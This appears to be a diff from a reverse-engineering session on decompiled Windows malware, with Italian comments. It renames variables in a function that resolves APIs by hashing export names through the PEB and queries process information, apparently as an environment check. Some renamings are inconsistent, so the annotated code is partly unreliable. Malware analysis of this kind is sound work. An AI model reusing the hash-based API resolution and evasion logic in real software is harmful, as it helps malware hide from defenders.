@@ -7,7 +7,7 @@ undefined4 get_api_obfuscated_and_check_stuff(void)
 	short sVar3;
 	uint uVar4;
 	char *pcVar5;
-	undefined *puVar6;
+	undefined *return_3b0991ae;
 	int iVar7;
 	int AddressOfNames;
 	uint8_t *puVar9;
@@ -84,30 +84,29 @@ undefined4 get_api_obfuscated_and_check_stuff(void)
 		RB[1] = "B";
 		local_8[0] = "r";
 		local_8[1] = "b";
-		puVar6 = (*function_3b0991ae)();
-		addressOfFunctions = (short *)0x0;
-		dll_base = (short *)((uint)puVar6 & 0xffff);
+		return_3b0991ae = (*function_3b0991ae)(); //GetCurrentProcess() or simiar
+		buf = 0;
 		iStack_20 = 0;
 		local_24 = dll_base;
-		puStack_c = puVar6;
-		export_directory = allocate_buffer_with_obfuscated_api(&addressOfFunctions, &iStack_20);
-		if ((export_directory == 0) && (addressOfFunctions != (short *)0x0))
+		puStack_c = return_3b0991ae;
+		success = call_virtual_alloc(&buf, &iStack_20);
+		if ((success == 0) && (buf != (short *)0x0))
 		{
-			export_directory = (*function_147dd28)(puVar6, 0x5a, addressOfFunctions, 4);
-			psVar13 = addressOfFunctions;
+			success = (*function_147dd28)(return_3b0991ae, 90, buf, 4); //NtQueryInformationProcess la flag 90 (informazioni non troppo utili sul processo)
+			buf = buf;
 			if (0 < export_directory)
 			{
 				uVar18 = 0;
 				do
 				{
 					psVar12 = (short *)RB[uVar18];
-					if (addressOfFunctions == (short *)0x0)
+					if (buf == (short *)0x0)
 					{
 						bVar19 = psVar12 == (short *)0x0;
 					LAB_004271b4:
 						if (bVar19)
 						{
-							if (addressOfFunctions == (short *)0x0)
+							if (buf == (short *)0x0)
 							{
 								return 1;
 							}
@@ -130,8 +129,8 @@ undefined4 get_api_obfuscated_and_check_stuff(void)
 					}
 					else if (psVar12 != (short *)0x0)
 					{
-						sVar3 = *addressOfFunctions;
-						psVar10 = addressOfFunctions;
+						sVar3 = *buf;
+						psVar10 = buf;
 						while ((sVar3 != 0 && (sVar3 == *psVar12)))
 						{
 							psVar1 = psVar10 + 1;
@@ -145,7 +144,7 @@ undefined4 get_api_obfuscated_and_check_stuff(void)
 					uVar18 = uVar18 + 1;
 				} while (uVar18 < 2);
 			}
-			if (addressOfFunctions != (short *)0x0)
+			if (buf != (short *)0x0)
 			{
 				psVar12 = *(short **)(*(int *)**(undefined4 **)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);
 				AddressOfnameOrdinals = psVar12;
@@ -179,9 +178,9 @@ undefined4 get_api_obfuscated_and_check_stuff(void)
 							}
 							iVar11 = hasher(puVar9, iVar11);
 							dll_base = local_24;
-							if (iVar11 == 0x1d499ba0)
+							if (iVar11 == 0x1d499ba0)//virtualfree 0x8000 flag for mem_release
 							{
-								function_3b0991ae = (code *)(*(int *)(iStack_10 +
+								function_1d499ba0= (code *)(*(int *)(iStack_10 +
 															(uint) * (ushort *)(RB[0] + uVar18 * 2) * 4) +
 												   (int)psVar12);
 								goto LAB_00427353;
@@ -190,87 +189,87 @@ undefined4 get_api_obfuscated_and_check_stuff(void)
 						} while (uVar18 < *(uint *)(export_directory + 0x18));
 					}
 				}
-				function_3b0991ae = (code *)0x0;
+				function_1d499ba0= (code *)0x0;
 			LAB_00427353:
-				(*function_3b0991ae)(psVar13, 0, 0x8000);
+				(*function_1d499ba0)(buf, 0, 0x8000); //chiama VirtualFree
 			}
 
-			addressOfFunctions = (short *)0x0;
+			buf = (short *)0x0;
 			iStack_10 = 0;
-			export_directory = allocate_buffer_with_obfuscated_api(&addressOfFunctions, &iStack_10);
-			if ((export_directory == 0) && (addressOfFunctions != (short *)0x0))
+			export_directory = call_virtual_alloc(&buf, &iStack_10);
+			if ((export_directory == 0) && (buf != (short *)0x0))
 			{
-				export_directory = (*function_147dd28)((uint)dll_base & 0xffff, 0x59, addressOfFunctions, 4);
-				dll_base = addressOfFunctions;
+				export_directory = (*function_147dd28)(dll_base & 0xffff, 0x59, buf, 4); //NtqueryInformationProcess flag 0x59
+				dll_base = buf;
 				if (0 < export_directory)
 				{
 					uVar18 = 0;
 					do
 					{
-						psVar13 = (short *)local_8[uVar18];
-						if (addressOfFunctions == (short *)0x0)
+						buf = (short *)local_8[uVar18];
+						if (buf == (short *)0x0)
 						{
-							bVar19 = psVar13 == (short *)0x0;
+							bVar19 = buf == (short *)0x0;
 						LAB_0042740e:
 							if (bVar19)
 							{
-								if (addressOfFunctions == (short *)0x0)
+								if (buf == (short *)0x0)
 								{
 									return 1;
 								}
-								psVar13 = *(short **)(*(int *)**(undefined4 **)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) +
+								buf = *(short **)(*(int *)**(undefined4 **)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) +
 													  0x18);
-								local_24 = psVar13;
-								if ((((psVar13 == (short *)0x0) || (*psVar13 != 0x5a4d)) ||
-									 (*(int *)(*(int *)(psVar13 + 0x1e) + (int)psVar13) != 0x4550)) ||
-									(export_directory = *(int *)(*(int *)(psVar13 + 0x1e) + 0x78 + (int)psVar13) + (int)psVar13, export_directory == 0))
+								local_24 = buf;
+								if ((((buf == (short *)0x0) || (*buf != 0x5a4d)) ||
+									 (*(int *)(*(int *)(buf + 0x1e) + (int)buf) != 0x4550)) ||
+									(export_directory = *(int *)(*(int *)(buf + 0x1e) + 0x78 + (int)buf) + (int)buf, export_directory == 0))
 									goto LAB_00427562;
 								uVar18 = 0;
-								AddressOfnameOrdinals = (short *)(*(int *)(export_directory + 0x1c) + (int)psVar13);
-								iStack_1c = *(int *)(export_directory + 0x20) + (int)psVar13;
-								iStack_20 = *(int *)(export_directory + 0x24) + (int)psVar13;
+								AddressOfnameOrdinals = (short *)(*(int *)(export_directory + 0x1c) + (int)buf);
+								iStack_1c = *(int *)(export_directory + 0x20) + (int)buf;
+								iStack_20 = *(int *)(export_directory + 0x24) + (int)buf;
 								if (*(int *)(export_directory + 0x18) == 0)
 									goto LAB_00427562;
 								goto LAB_00427530;
 							}
 						}
-						else if (psVar13 != (short *)0x0)
+						else if (buf != (short *)0x0)
 						{
-							sVar3 = *addressOfFunctions;
-							psVar12 = addressOfFunctions;
-							while ((sVar3 != 0 && (sVar3 == *psVar13)))
+							sVar3 = *buf;
+							psVar12 = buf;
+							while ((sVar3 != 0 && (sVar3 == *buf)))
 							{
 								psVar10 = psVar12 + 1;
 								psVar12 = psVar12 + 1;
-								psVar13 = psVar13 + 1;
+								buf = buf + 1;
 								sVar3 = *psVar10;
 							}
-							bVar19 = *psVar12 == *psVar13;
+							bVar19 = *psVar12 == *buf;
 							goto LAB_0042740e;
 						}
 						uVar18 = uVar18 + 1;
 					} while (uVar18 < 2);
 				}
-				if (addressOfFunctions != (short *)0x0)
+				if (buf != (short *)0x0)
 				{
-					psVar13 = *(short **)(*(int *)**(undefined4 **)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);
-					local_24 = psVar13;
-					if (((psVar13 != (short *)0x0) && (*psVar13 == 0x5a4d)) &&
-						((*(int *)(*(int *)(psVar13 + 0x1e) + (int)psVar13) == 0x4550 &&
-						  (export_directory = *(int *)(*(int *)(psVar13 + 0x1e) + 0x78 + (int)psVar13) + (int)psVar13,
+					buf = *(short **)(*(int *)**(undefined4 **)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);
+					local_24 = buf;
+					if (((buf != (short *)0x0) && (*buf == 0x5a4d)) &&
+						((*(int *)(*(int *)(buf + 0x1e) + (int)buf) == 0x4550 &&
+						  (export_directory = *(int *)(*(int *)(buf + 0x1e) + 0x78 + (int)buf) + (int)buf,
 						   export_directory != 0))))
 					{
 						uVar18 = 0;
-						AddressOfnameOrdinals = (short *)(*(int *)(export_directory + 0x1c) + (int)psVar13);
-						iStack_1c = *(int *)(export_directory + 0x20) + (int)psVar13;
-						iStack_20 = *(int *)(export_directory + 0x24) + (int)psVar13;
+						AddressOfnameOrdinals = (short *)(*(int *)(export_directory + 0x1c) + (int)buf);
+						iStack_1c = *(int *)(export_directory + 0x20) + (int)buf;
+						iStack_20 = *(int *)(export_directory + 0x24) + (int)buf;
 						if (*(int *)(export_directory + 0x18) != 0)
 						{
 							do
 							{
 								pcVar14 = (char *)0x0;
 								RB[0] = (char *)0x0;
-								puVar9 = (uint8_t *)(*(int *)(iStack_1c + uVar18 * 4) + (int)psVar13);
+								puVar9 = (uint8_t *)(*(int *)(iStack_1c + uVar18 * 4) + (int)buf);
 								if (puVar9 != (uint8_t *)0x0)
 								{
 									uVar2 = *puVar9;
@@ -283,18 +282,18 @@ undefined4 get_api_obfuscated_and_check_stuff(void)
 									}
 								}
 								AddressOfNames = hasher(puVar9, (int)pcVar14);
-								if (AddressOfNames == 0x1d499ba0)
+								if (AddressOfNames == 0x1d499ba0)// ancora virtualfree 
 								{
-									function_3b0991ae = (code *)(*(int *)(AddressOfnameOrdinals +
+									function_1d499ba0= (code *)(*(int *)(AddressOfnameOrdinals +
 																(uint) * (ushort *)(iStack_20 + uVar18 * 2) * 2) +
-													   (int)psVar13);
+													   (int)buf);
 									goto LAB_004275b9;
 								}
 								uVar18 = uVar18 + 1;
 							} while (uVar18 < *(uint *)(export_directory + 0x18));
 						}
 					}
-					function_3b0991ae = (code *)0x0;
+					function_1d499ba0= (code *)0x0;
 				LAB_004275b9:
 					(*function_3b0991ae)(dll_base, 0, 0x8000);
 				}
@@ -331,7 +330,7 @@ LAB_004272c2:
 	iVar7 = hasher(puVar9, len);
 	if (iVar7 == 0x1d499ba0)
 	{
-		function_3b0991ae = (code *)(*(int *)((int)dll_base + (uint)(ushort)AddressOfnameOrdinals[uVar18] * 4 + AddressOfNames) +
+		function_1d499ba0= (*((int)dll_base + (uint)(ushort)AddressOfnameOrdinals[uVar18] * 4 + AddressOfNames) +
 						   (int)dll_base);
 		goto LAB_004272f3;
 	}
@@ -339,16 +338,16 @@ LAB_004272c2:
 	if (*(uint *)(export_directory + 0x18) <= uVar18)
 	{
 	LAB_004272f1:
-		function_3b0991ae = (code *)0x0;
+		function_1d499ba0= (code *)0x0;
 	LAB_004272f3:
-		(*function_3b0991ae)(psVar13, 0, 0x8000);
+		(*function_3b0991ae)(buf, 0, 0x8000);
 		return 1;
 	}
 	goto LAB_004272c2;
 LAB_00427530:
 	pcVar14 = (char *)0x0;
 	RB[0] = (char *)0x0;
-	puVar9 = (uint8_t *)(*(int *)(iStack_1c + uVar18 * 4) + (int)psVar13);
+	puVar9 = (uint8_t *)(*(int *)(iStack_1c + uVar18 * 4) + (int)buf);
 	if (puVar9 != (uint8_t *)0x0)
 	{
 		uVar2 = *puVar9;
@@ -363,15 +362,15 @@ LAB_00427530:
 	AddressOfNames = hasher(puVar9, (int)pcVar14);
 	if (AddressOfNames == 0x1d499ba0)
 	{
-		function_3b0991ae = (code *)(*(int *)(AddressOfnameOrdinals + (uint) * (ushort *)(iStack_20 + uVar18 * 2) * 2) +
-						   (int)psVar13);
+		function_1d499ba0= (code *)(*(int *)(AddressOfnameOrdinals + (uint) * (ushort *)(iStack_20 + uVar18 * 2) * 2) +
+						   (int)buf);
 		goto LAB_00427564;
 	}
 	uVar18 = uVar18 + 1;
 	if (*(uint *)(export_directory + 0x18) <= uVar18)
 	{
 	LAB_00427562:
-		function_3b0991ae = (code *)0x0;
+		function_1d499ba0= (code *)0x0;
 	LAB_00427564:
 		(*function_3b0991ae)(dll_base, 0, 0x8000);
 		return 1;
